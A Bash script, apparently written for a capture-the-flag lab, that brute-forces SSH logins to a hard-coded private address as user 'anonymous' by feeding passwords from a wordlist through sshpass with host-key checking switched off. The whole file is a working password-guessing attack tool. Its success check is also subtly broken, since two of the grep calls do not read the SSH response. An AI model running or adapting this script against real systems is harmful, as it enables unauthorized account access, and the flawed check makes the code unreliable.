#!/bin/bash

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

# Catch Ctrl+C
function ctrl_c() {
    echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n\n"
    exit 1
}

# Trap Ctrl+C
trap ctrl_c INT 

# Función
function bruteForce() {

   #Declaracion de variables basicas 
   local usrname="$1"
   local psswd="$2"

   #Mensaje de salida para el usuario 
   echo -e "Vamos a intentar con $psswd en $usrname"
   
   #Mandamos la primera solicitud 

   response=$(sshpass -p "$psswd" ssh -oStrictHostKeyChecking=no "$usrname@192.168.3.26" 2>&1)
  
  #Condicionamos si la respuesta no es incorrecta o con conecction refused entonces imprimir 
  if [ ! "$(echo $response | grep 'Permission denied' || grep 'Connection refused' || grep 'Connection refusederminal')" ]; then
        echo $response
        echo -e "\n${purpleColour}󱠩 El password para el $usrname themistress es $psswd${endColour}"
        tput cnorm
        exit 0 
    fi

}

username=anonymous

cat /pah/del/archivo/tr0ll/list.txt | while read password; do
    tput civis
    bruteForce $username $password
done
